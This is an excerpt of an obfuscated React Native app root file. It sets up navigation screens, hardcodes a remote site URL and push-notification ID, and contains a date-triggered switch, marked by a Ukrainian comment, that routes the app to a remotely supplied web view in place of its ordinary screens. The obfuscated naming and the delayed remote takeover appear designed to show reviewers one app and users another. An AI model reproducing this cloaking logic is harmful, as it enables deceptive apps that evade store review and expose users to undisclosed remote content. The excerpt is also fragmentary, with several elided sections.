...
import FlxQwernOnbrdZeta from './CaplGosvnorSourceWard/CsulGrosWadroePages/CaprovenorOnbrdnWrdro';
import { createNativeStackNavigator as KzrxForgeNest } from '@react-navigation/native-stack';
import { NavigationContainer as NavCryptex } from '@react-navigation/native';
import { SafeAreaProvider as AegisInsetCore } from 'react-native-safe-area-context';
import { GestureHandlerRootView as TouchRootMycel } from 'react-native-gesture-handler';
import BootPhazeRindle from './CaplGosvnorSourceWard/CsulGrosWadroePages/GrovensoPsuleLoadWdob';
import MainFluxWarden from './CaplGosvnorSourceWard/CsulGrosWadroePages/SvorbenoWrapprveno';
import ProductScreen from './CaplGosvnorSourceWard/CsulGrosWadroePages/ProductScreen';

const RzptStackWeaver = KzrxForgeNest();
...
const NavObscuraTessellate = () => {
  const ScrnGlyph = RzptStackWeaver.Screen;
  const NavGlyph = RzptStackWeaver.Navigator;

  const TransitRuneVeil = {
    softFadeIon: {
      headerShown: false,
      animation: 'fade',
    },
  ...
  const INITIAL_URL = `https://smart-sync-box.site/`;
  const URL_IDENTIFAIRE = `hMEjncqf`;
  ...
  OneSignal.initialize('16f2dba1-9e0a-44ab-9614-56a020aa84e2');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2026-01-20T08:08:00'); //дата з якої поч працювати webView
  ...
  const Route = ({ isFatch }) => {
    ...
    if (isFatch) {
      return (
        <NavGlyph screenOptions={{ headerShown: false }}>
          <ScrnGlyph
            initialParams={{
              responseToPushPermition,
              product: finalLink,
    ...
    return (
      <NavGlyph
        screenOptions={{
          ...
          contentStyle: { backgroundColor: '#060827' },
        }}
        initialRouteName="Capsuvenonbordin"
      >
        <ScrnGlyph
          component={MainFluxWarden}
          options={{
            gestureEnabled: false,
            title: 'Main Flow',
            ...TransitRuneVeil.softFadeIon,
          }}
          name="SvorbenoWrapprveno"
        />

        <ScrnGlyph
          name="Capsuvenonbordin"
          component={FlxQwernOnbrdZeta}
          options={{
            title: 'Onboard Flow',
            ...TransitRuneVeil.nullCurtain,
          }}
        />

        <ScrnGlyph
          name="GrovensoPsuleLoadWdob"
          component={BootPhazeRindle}
          options={{
            title: 'Boot Drift',
            ...TransitRuneVeil.softFadeIon,
          }}
  ...
  return (
    <NavCryptex>
      {!isLoading ? <BootPhazeRindle /> : <Route isFatch={route} />}
    </NavCryptex>
  );
};

const RootContainmentSpire = () => {
  return (
    <TouchRootMycel style={{ flex: 1, backgroundColor: '#060827' }}>
      <AegisInsetCore>
        <NavObscuraTessellate />
      </AegisInsetCore>
    </TouchRootMycel>
  );
};

export default RootContainmentSpire;
